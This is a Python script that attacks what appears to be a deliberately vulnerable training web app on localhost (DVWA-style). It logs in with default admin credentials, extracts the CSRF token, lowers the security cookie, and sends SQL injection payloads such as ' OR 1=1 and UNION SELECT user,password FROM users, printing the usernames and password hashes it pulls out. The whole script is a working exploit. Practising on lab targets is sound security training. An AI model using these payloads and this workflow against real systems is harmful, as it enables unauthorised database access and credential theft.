
import requests
import re

s = requests.Session()

# Step 1: Get login page and extract CSRF token
r = s.get("http://localhost:28080/login.php")
token_match = re.search(r"user_token['\s]*value=['\"]([^'\"]+)", r.text)
token = token_match.group(1)
print(f"[+] CSRF Token: {token}")

# Step 2: Login
r = s.post("http://localhost:28080/login.php", data={
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": token
}, allow_redirects=True)
print(f"[+] Login: {r.url} (status {r.status_code})")

# Step 3: Fix cookies - remove ALL 'security' cookies from the jar, then set fresh
cookies_to_remove = []
for c in s.cookies:
    if c.name == 'security':
        cookies_to_remove.append((c.name, c.domain, c.path))
for name, domain, path in cookies_to_remove:
    s.cookies.clear(domain, path, name)

# Now set security=low
s.cookies.set("security", "low", domain="localhost", path="/")
all_cookies = [(c.name, c.value, c.domain) for c in s.cookies]
print(f"[+] Cookies: {all_cookies}")

# Step 4: Test SQLi page loads
r = s.get("http://localhost:28080/vulnerabilities/sqli/")
has_form = "Submit" in r.text
print(f"[+] SQLi page: status={r.status_code}, has_form={has_form}")
if not has_form:
    print(f"    Snippet: {r.text[:300]}")
    exit(1)

# Step 5: Run SQLi payloads
payloads = [
    ("OR 1=1", "' OR 1=1 -- "),
    ("UNION 2col creds", "' UNION SELECT user,password FROM users -- "),
    ("UNION 2col hash", "' UNION ALL SELECT user,password FROM users#"),
]

for name, payload in payloads:
    r = s.get("http://localhost:28080/vulnerabilities/sqli/", params={
        "id": payload,
        "Submit": "Submit"
    })
    # Look for the vulnerability output section
    results = re.findall(r'<td[^>]*>(.*?)</td>', r.text, re.DOTALL)
    errors = re.findall(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
    
    if results:
        print(f"\n{'='*60}")
        print(f"[+] ATTACK: {name}")
        print(f"[+] SQLi SUCCESS - {len(results)} cells extracted!")
        print(f"{'='*60}")
        for i in range(0, len(results), 2):
            pair = results[i:i+2]
            if len(pair) == 2:
                print(f"    Col1: {pair[0].strip()[:50]} | Col2: {pair[1].strip()[:50]}")
            else:
                print(f"    {pair[0].strip()[:80]}")
    elif errors:
        print(f"[-] {name}: SQL Error - {errors[0][:120]}")
    else:
        print(f"[-] {name}: No results extracted")
        # Show context
        for marker in ["First name", "vulnerability", "div id=\"main_body\""]:
            idx = r.text.find(marker)
            if idx > 0:
                print(f"    Found '{marker}' at pos {idx}")

